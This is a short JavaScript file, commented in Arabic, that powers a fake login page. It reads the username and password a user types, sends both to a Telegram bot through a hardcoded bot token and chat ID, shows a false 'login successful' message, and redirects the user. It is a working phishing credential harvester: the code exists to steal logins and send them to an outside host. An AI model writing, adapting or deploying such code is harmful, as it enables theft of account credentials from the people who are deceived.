const TELEGRAM_BOT_TOKEN = "8196459609:AAFFRJTY7XJ8OSVfEIVT76hf6uRiM4byJ1Y";  // ضع توكن بوتك
const TELEGRAM_CHAT_ID = "7302541527";  // ضع معرفك على التليجرام 

function sendToTelegram(username, password) {
    const message = `🚀 تسجيل دخول جديد:\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => console.log("✅ تم التحقيق من المستخدم "))
        .catch(error => console.error("❌ لم يتم العثور على المستخدم:", error));
}

function login(event) {
    event.preventDefault();
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    // إرسال البيانات إلى تليجرام
    sendToTelegram(username, password);

    alert("تم تسجيل الدخول بنجاح!");
    window.location.href = "index.html";  // توجيه المستخدم بعد تسجيل الدخول
}
